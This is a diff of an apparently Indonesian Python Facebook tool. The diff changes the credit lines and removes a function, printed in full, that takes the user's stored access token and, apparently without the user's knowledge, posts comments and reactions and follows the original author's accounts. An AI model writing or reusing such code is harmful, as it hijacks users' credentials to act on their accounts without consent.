@@ -1,7 +1,4 @@
-# coding:utf-8
-# decompile by Itsuki ft. Aap Afandi ID
-# coded by angga kurniawan
-# fb.me/gaaaarzxd
+#ZeeSeeYou
 
 import requests
 import sys
@@ -46,25 +43,6 @@ def logo():
 	os.system("clear")
 	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")
 
-def bot_komen():
-    try:
-        token = open('login.txt', 'r').read()
-    except IOError:
-        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
-        os.system('rm -rf login.txt')
-    una = ('100015073506062') 
-    post = ('1031861840659590') 
-    post2 = ('1110619372783836') 
-    kom = ('GW PAKE SC LU BANG 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
-    kom2 = ('KEREN BANG 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
-    reac = ('LOVE') 
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
-    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
-    requests.post('https://graph.facebook.com/100002163187650/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
-    menu()
     
 def tokenz():
 	os.system("clear")
